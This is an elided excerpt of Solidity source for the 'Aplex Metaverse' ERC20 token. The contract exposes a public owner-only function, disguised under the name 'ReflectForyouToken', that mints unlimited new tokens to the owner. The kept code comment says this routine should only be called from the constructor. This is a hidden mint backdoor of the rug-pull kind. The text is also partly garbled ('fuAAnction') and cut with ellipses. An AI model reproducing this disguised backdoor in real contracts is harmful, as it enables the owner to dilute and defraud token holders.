...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectForyouToken(uint256 amount) public onlyOwner {
    ReflectForyouToken(msg.sender, amount);
    }
    ...
    function ReflectForyouToken(address account, uint256 amount) internal virtual {
     ...
     *
     * WARNING: This fuAAnction should only be called from the constructor. Most
...
contract PLEX is ERC20 {

    uint tokenTotalSupply = 10000000000; 

    constructor() public ERC20("Aplex Metaverse", "APLEX") {
        ReflectForyouToken(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}